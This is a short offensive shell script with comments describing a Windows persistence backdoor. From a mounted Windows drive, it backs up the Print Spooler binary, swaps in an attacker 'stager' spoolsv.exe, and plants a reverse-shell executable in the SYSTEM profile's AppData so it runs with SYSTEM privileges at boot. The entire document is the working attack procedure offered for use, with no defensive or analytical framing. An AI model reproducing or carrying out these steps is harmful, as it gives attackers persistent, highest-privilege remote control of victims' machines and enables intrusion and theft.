#backdoor_implant_SYSTEM.txt
#The SYSTEM backdoor implant works by swapping a legitimate 
# Windows service binary with attacker binary.
# In this version, print spooler service is hijacked,
# which runs by default as SYSTEM.
# Service binary resides in C:\Windows\System32\spoolsv.exe. 




# Windows drive mounted, legitamate binary backed up, renamed to spoolsv.exe
mv /mnt/Windows/System32/spoolsv.exe /mnt/Windows/System32/spoolsv.exe.bak
#
# Attacker hacked version of spoolsv.exe is copied over, which will hijack 
# the service execution.
cp /home/tc/payloads/spoolsv.exe /mnt/Windows/System32/spoolsv.exe
#
# Hacked spoolsv.exe is a stager which will attampt to execute 
# %appdata%\start.exe of the SYSTEM profile. 
# This is the reverse shell binary.
cp /home/tc/payloads/start.exe /mnt/Windows/System32/config/systemprofile/AppData/Roaming/start.exe
